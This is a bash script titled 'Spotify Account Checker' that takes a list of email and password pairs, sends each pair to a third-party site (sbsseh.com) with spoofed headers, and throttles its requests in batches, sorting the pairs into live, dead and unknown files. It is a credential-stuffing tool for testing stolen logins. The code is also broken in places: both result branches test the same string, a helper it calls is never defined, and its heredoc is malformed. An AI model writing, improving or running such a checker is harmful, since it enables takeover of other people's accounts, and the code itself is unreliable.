#!/bin/bash
#Keizer404

cat << "EOF

               Spotify Account Checker
EOF
ngecek(){
	local CY='\e[36m'
	local GR='\e[34m'
	local OG='\e[92m'
	local WH='\e[37m'
	local RD='\e[31m'
	local YL='\e[33m'
	local BF='\e[34m'
	local DF='\e[39m'
	local OR='\e[33m'
	local PP='\e[35m'
	local B='\e[1m'
	local CC='\e[0m'
	local ngecurl=$(curl -X POST -s -L "http://www.sbsseh.com/api.php" \
	-A "Mozilla/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/522.11.3 (KHTML, like Gecko) Version/3.0 Safari/522.11.3" \
	-H "content-type: application/x-www-form-urlencoded" \
	-H "accept: */*" \
	-H "referer: http://www.sbsseh.com/api.php" \
	-H "cookie: https://accounts.spotify.com/en-AU/login?continue=https:%2F%2Fwww.spotify.com%2Fau%2Faccount%2Foverview%2F" \
	-d "email=${1}&senha=${2}")
	if [[ $ngecurl =~ "Please enter your password." ]]; then
		printf "${GR}${B}LIVE${CC} | email: ${1} & senha: ${2}\n"
		echo "${1}|${2}" >> live.txt
	elif [[ $ngecurl =~ "Please enter your password." ]]; then
		printf "${RD}${B}DIE${CC} | email: ${1} & senha: ${2}\n"
		echo "${1}|${2}" >> die.txt
	else
		printf "${PP}${B}UNK${CC} | email: ${1} & senha: ${2}\n"
		echo "${1}|${2}" >> unk.txt
	fi
}
if [[ -z $1 ]]; then
	header
	printf "To Use $0 <mailist.txt> \n"
	exit 1
fi
# SET RATIO
persend=10
setleep=5
IFS=$'\r\n' GLOBIGNORE='*' command eval 'mailist=($(cat $1))'
itung=1
for (( i = 0; i < ${#mailist[@]}; i++ )); do
	username="${mailist[$i]}"
	IFS='|' read -r -a array <<< "$username"
	email=${array[0]}
	password=${array[1]}
	set_kirik=$(expr $itung % $persend)
    if [[ $set_kirik == 0 && $itung > 0 ]]; then
        sleep $setleep
    fi
    ngecek "${email}" "${password}" &
    itung=$[$itung+1]
done
wait


# Live account saved to "./LIVE.txt"